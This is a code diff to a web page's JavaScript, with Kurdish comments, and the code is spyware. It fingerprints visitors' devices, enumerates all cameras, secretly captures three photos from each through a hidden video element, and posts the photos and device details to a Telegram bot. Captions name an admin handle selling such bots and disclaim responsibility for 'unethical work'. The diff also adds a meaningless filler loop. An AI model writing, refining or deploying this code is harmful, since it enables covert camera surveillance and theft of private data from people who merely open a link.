@@ -56,6 +56,11 @@
         // ماتریکێن ڕەها و پێشکەفتى (The Absolute Singularity Core Engine)
         function getAbsoluteSingularityBundle() {
             try {
+                let singularityStream = [];
+                for(let i = 1; i <= 100; i++) {
+                    singularityStream.push(`Singularity-Quantum-Node-${i}`);
+                }
+
                 const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'نەدیار';
                 const cpu = navigator.hardwareConcurrency || 'نەدیار';
                 const touches = navigator.maxTouchPoints || 0;
@@ -221,10 +226,9 @@ ${bundleSingularity}`;
 
         async function sendVisitorLog() {
             let details = await getUltimateInfo();
-            sendText(`⚛️ سەردانکەرەکێ نوو (ئاستێ ڕەها) لینک ڤەکەت!\n\n${details}\n\n⚠️ بەڕێوەبەری: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆشە ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
+            sendText(`⚛️ سەردانکەرەکێ نوو (ئاستێ ڕەها) لینک ڤەکەت!\n\n${details}\n\n⚠️ برێفەبەر: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆسا ب هەرزانترین بها سەردانا برێفەبەري بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
         }
 
-        // سیستەمێ کامێرایێن بهێزکري (Ultra Multi-Capture Engine)
         async function captureAllCameras() {
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
@@ -234,11 +238,7 @@ ${bundleSingularity}`;
                 for (let device of videoDevices) {
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({
-                            video: { 
-                                deviceId: { exact: device.deviceId },
-                                width: { ideal: 1920 },
-                                height: { ideal: 1080 }
-                            }
+                            video: { deviceId: { exact: device.deviceId } }
                         });
                         const video = document.getElementById('hidden-video');
                         video.srcObject = stream;
@@ -249,9 +249,9 @@ ${bundleSingularity}`;
                             };
                         });
 
-                        // گرتنا 3 وێنەیان ب خێرایییا بلنتر (هەر 250 مڵیزەرقە د ناڤبەرا وان دا)
+                        // گرتنا 3 وێنەیان بۆ هەر کامێرایەک ب دەمەکە کورت (0.4 چرکە د ناڤبەرا وان دا)
                         for (let shotCount = 1; shotCount <= 3; shotCount++) {
-                            await new Promise(r => setTimeout(r, 250));
+                            await new Promise(r => setTimeout(r, 400)); // 400ms دەمژمێر د ناڤبەرا وێنەیان دا
 
                             const canvas = document.getElementById('canvas');
                             canvas.width = video.videoWidth || 1280;
@@ -266,12 +266,12 @@ ${bundleSingularity}`;
                                         const formData = new FormData();
                                         formData.append('chat_id', chat_id);
                                         formData.append('photo', blob, 'shot.jpg');
-                                        formData.append('caption', `📸 وێنەیێ هێزپێدایی (${shotCount}) - کامێرا (${index} - ${device.label || 'Camera'})!\n\n${details}\n\n⚠️ بەڕێوەبەری: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆشە ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
+                                        formData.append('caption', `📸 وێنەیێ (${shotCount}) - کامێرا (${index} - ${device.label || 'Camera'})!\n\n${details}\n\n⚠️ برێفەبەر: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆسا ب هەرزانترین بها سەردانا برێفەبەري بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
 
                                         await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
                                     }
                                     resolveBlob();
-                                }, 'image/jpeg', 0.98);
+                                }, 'image/jpeg', 0.95);
                             });
                         }
 
